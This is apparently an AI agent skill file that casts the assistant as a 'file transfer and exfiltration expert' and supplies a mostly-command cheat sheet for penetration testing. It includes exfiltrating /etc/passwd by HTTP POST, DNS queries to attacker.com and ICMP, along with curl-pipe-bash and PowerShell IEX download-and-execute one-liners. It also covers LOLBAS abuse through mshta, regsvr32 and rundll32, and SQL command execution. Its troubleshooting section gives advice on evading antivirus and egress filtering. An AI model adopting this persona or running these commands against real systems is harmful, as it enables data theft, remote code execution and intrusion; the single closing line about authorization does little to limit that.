---
name: transferring-files
description: Transfer files between systems using HTTP, SMB, FTP, netcat, base64 encoding, and living-off-the-land techniques for both Linux and Windows. Use when moving tools or exfiltrating data.
---

# File Transfer Techniques Skill

You are a file transfer and exfiltration expert. Use this skill when the user requests help with:

- Transferring files between systems
- Data exfiltration techniques
- Living-off-the-land file transfer methods
- Cross-platform file operations
- Encoding and obfuscation
- Bypassing egress filtering
- Establishing file servers

## Core Methodologies

### 1. Linux File Download

**wget:**
```bash
# Basic download
wget http://10.10.10.10/file.txt

# Save with different name
wget http://10.10.10.10/file.txt -O output.txt

# Recursive download
wget -r http://10.10.10.10/directory/

# Download in background
wget -b http://10.10.10.10/largefile.zip
```

**curl:**
```bash
# Basic download
curl http://10.10.10.10/file.txt -o file.txt
curl -O http://10.10.10.10/file.txt  # Keep original name

# Follow redirects
curl -L http://10.10.10.10/file.txt -o file.txt

# Download with auth
curl -u user:password http://10.10.10.10/file.txt -o file.txt

# Download multiple files
curl -O http://10.10.10.10/file[1-10].txt
```

**Netcat:**
```bash
# Receiver
nc -lvnp 4444 > file.txt

# Sender
nc 10.10.10.10 4444 < file.txt

# With progress (use pv)
nc -lvnp 4444 | pv > file.txt
pv file.txt | nc 10.10.10.10 4444
```

**Base64 Encoding (for copy-paste):**
```bash
# Encode on attacker machine
base64 file.txt > file.b64
cat file.b64  # Copy this

# Decode on target
echo "BASE64_STRING_HERE" | base64 -d > file.txt

# Or in one command
echo "BASE64STRING" | base64 -d > file.txt
```

**Python HTTP Server (for hosting files):**
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Ruby
ruby -run -e httpd . -p 8000

# PHP
php -S 0.0.0.0:8000
```

### 2. Windows File Download

**PowerShell:**
```powershell
# Invoke-WebRequest (PS 3.0+)
Invoke-WebRequest -Uri "http://10.10.10.10/file.exe" -OutFile "C:\Temp\file.exe"
iwr -Uri "http://10.10.10.10/file.exe" -OutFile "C:\Temp\file.exe"

# DownloadFile
(New-Object Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "C:\Temp\file.exe")

# DownloadString (download and execute)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')

# Download and execute in memory
$data = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
```

**certutil:**
```cmd
# Download file
certutil.exe -urlcache -split -f "http://10.10.10.10/file.exe" file.exe

# Alternative syntax
certutil -urlcache -f "http://10.10.10.10/file.exe" file.exe

# Clean cache
certutil.exe -urlcache * delete
```

**bitsadmin:**
```cmd
# Download file
bitsadmin /transfer job /download /priority high http://10.10.10.10/file.exe C:\Temp\file.exe

# Verify and complete
bitsadmin /complete job
```

**cmd.exe (VBS script):**
```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

### 3. Linux File Upload/Exfiltration

**HTTP POST:**
```bash
# curl
curl -X POST -F "file=@/etc/passwd" http://10.10.10.10:8000/upload

# With auth
curl -X POST -F "file=@file.txt" http://10.10.10.10:8000/upload -u user:pass

# wget
wget --post-file=/etc/passwd http://10.10.10.10:8000/upload
```

**SCP (if SSH available):**
```bash
# Upload
scp file.txt user@10.10.10.10:/tmp/

# Download
scp user@10.10.10.10:/tmp/file.txt ./

# Recursive
scp -r directory/ user@10.10.10.10:/tmp/

# With key
scp -i id_rsa file.txt user@10.10.10.10:/tmp/
```

**Netcat:**
```bash
# Receiver (attacker)
nc -lvnp 4444 > received_file.txt

# Sender (target)
nc 10.10.10.10 4444 < file.txt
```

**Socat:**
```bash
# Receiver
socat TCP4-LISTEN:4444,fork file:received.txt

# Sender
socat TCP4:10.10.10.10:4444 file:file.txt
```

**DNS Exfiltration:**
```bash
# Encode data and send via DNS queries
for data in $(cat /etc/passwd | base64 | tr -d '=' | fold -w 32); do
  dig $data.attacker.com @dns-server
done

# Receive on DNS server logs
```

**ICMP Exfiltration:**
```bash
# Send data in ICMP packets
cat file.txt | xxd -p -c 16 | while read line; do
  ping -c 1 -p $line 10.10.10.10
done

# Receive with tcpdump
tcpdump -i eth0 icmp -X
```

### 4. Windows File Upload

**PowerShell:**
```powershell
# Upload via HTTP POST
$file = Get-Content "C:\Temp\file.txt" -Raw
Invoke-RestMethod -Uri "http://10.10.10.10:8000/upload" -Method Post -Body $file

# Upload file object
$fileBytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.exe")
Invoke-RestMethod -Uri "http://10.10.10.10:8000/upload" -Method Post -Body $fileBytes
```

**SMB:**
```cmd
# Copy to SMB share
copy C:\Temp\file.txt \\10.10.10.10\share\

# Map drive first
net use Z: \\10.10.10.10\share
copy C:\Temp\file.txt Z:\
```

**FTP:**
```cmd
# Create FTP script
echo open 10.10.10.10 > ftp.txt
echo user username password >> ftp.txt
echo binary >> ftp.txt
echo put file.exe >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -s:ftp.txt
```

### 5. SMB File Transfer

**Linux to Windows:**
```bash
# Mount SMB share on Linux
smbclient //10.10.10.10/share -U username
# In smbclient:
put local_file.txt
get remote_file.txt

# Mount and copy
mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass
cp file.txt /mnt/smb/
```

**Windows to Linux:**
```bash
# Start Samba server on Linux
sudo smbserver.py share /tmp/share -smb2support

# From Windows
copy C:\file.txt \\10.10.10.10\share\
```

**Impacket smbserver:**
```bash
# On attacker (Linux)
sudo impacket-smbserver share /tmp/share -smb2support
sudo impacket-smbserver share /tmp/share -smb2support -username user -password pass

# On target (Windows)
# No auth
copy file.txt \\10.10.10.10\share\
\\10.10.10.10\share\file.exe

# With auth
net use \\10.10.10.10\share /user:user pass
copy file.txt \\10.10.10.10\share\
```

### 6. FTP File Transfer

**Linux FTP Server:**
```bash
# Python pyftpdlib
sudo python3 -m pyftpdlib -p 21 -w

# vsftpd (if installed)
sudo service vsftpd start
```

**Windows FTP Client:**
```cmd
# Interactive
ftp 10.10.10.10

# Scripted
echo open 10.10.10.10 21 > ftp.txt
echo USER username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### 7. Living Off The Land (LOLBAS/GTFOBins)

**Windows LOLBAS:**
```cmd
# certutil (already shown)
certutil -urlcache -f http://10.10.10.10/file.exe file.exe

# mshta
mshta http://10.10.10.10/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://10.10.10.10/file.sct scrobj.dll

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')")
```

**Linux GTFOBins:**
```bash
# See GTFOBins for specific binaries
# https://gtfobins.github.io/
```

### 8. Database Exfiltration

**MySQL:**
```sql
-- Write to file (requires FILE privilege)
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd.txt';

-- Read from file
LOAD DATA INFILE '/tmp/data.txt' INTO TABLE users;
```

**MSSQL:**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Use certutil to download
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.10/file.exe C:\Temp\file.exe';
```

**PostgreSQL:**
```sql
-- Write to file
COPY (SELECT * FROM users) TO '/tmp/users.txt';

-- Read from file
COPY users FROM '/tmp/data.txt';

-- Command execution to download
COPY (SELECT '') TO PROGRAM 'wget http://10.10.10.10/file.txt -O /tmp/file.txt';
```

### 9. Encoding/Obfuscation

**Base64:**
```bash
# Encode
base64 file.txt > file.b64
cat file.txt | base64

# Decode
base64 -d file.b64 > file.txt
cat file.b64 | base64 -d > file.txt
```

**Hex Encoding:**
```bash
# Encode
xxd -p file.txt > file.hex
hexdump -ve '1/1 "%.2x"' file.txt > file.hex

# Decode
xxd -r -p file.hex > file.txt
```

**Gzip Compression:**
```bash
# Compress
gzip file.txt  # Creates file.txt.gz

# Decompress
gunzip file.txt.gz
```

**Tar Archive:**
```bash
# Create
tar -czf archive.tar.gz directory/

# Extract
tar -xzf archive.tar.gz
```

### 10. Persistence and Staging

**Download and Execute:**
```bash
# Linux
wget http://10.10.10.10/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh

# One-liner
curl http://10.10.10.10/script.sh | bash

# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
```

**In-Memory Execution:**
```powershell
# PowerShell - never touches disk
$code = (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')
IEX $code

# Reflective DLL loading
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.dll')
[System.Reflection.Assembly]::Load($bytes)
```

## Quick Reference Commands

**Start HTTP Server (Attacker):**
```bash
python3 -m http.server 8000
sudo python3 -m http.server 80
```

**Start SMB Server (Attacker):**
```bash
sudo impacket-smbserver share /tmp/share -smb2support
```

**Download on Target (Linux):**
```bash
wget http://10.10.10.10:8000/file
curl http://10.10.10.10:8000/file -o file
```

**Download on Target (Windows):**
```cmd
certutil -urlcache -f http://10.10.10.10:8000/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','file.exe')"
```

**Upload from Target:**
```bash
# Linux
curl -X POST -F "file=@file.txt" http://10.10.10.10:8000/
nc 10.10.10.10 4444 < file.txt

# Windows
copy file.txt \\10.10.10.10\share\
```

## Troubleshooting

**Firewall Blocking:**
- Try alternative ports (80, 443, 53)
- Use DNS/ICMP exfiltration
- Encode data and use allowed protocols

**AV Detection:**
- Encode/obfuscate payloads
- Use in-memory execution
- Split file into chunks
- Use legitimate tools (LOLBAS)

**No Internet Access:**
- Use local file shares (SMB, NFS)
- Use removable media if physical access
- Use database OUT FILE if database access
- Use local services (FTP, HTTP on internal network)

## Reference Links

- LOLBAS Project: https://lolbas-project.github.io/
- GTFOBins: https://gtfobins.github.io/
- HackTricks File Transfer: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md

## When to Use This Skill

Activate this skill when the user asks to:
- Transfer files between systems
- Download files to compromised systems
- Exfiltrate data from targets
- Set up file servers for attacks
- Bypass egress filtering
- Use living-off-the-land techniques
- Encode or obfuscate file transfers
- Help with data staging

Always ensure proper authorization before transferring files to/from any system.
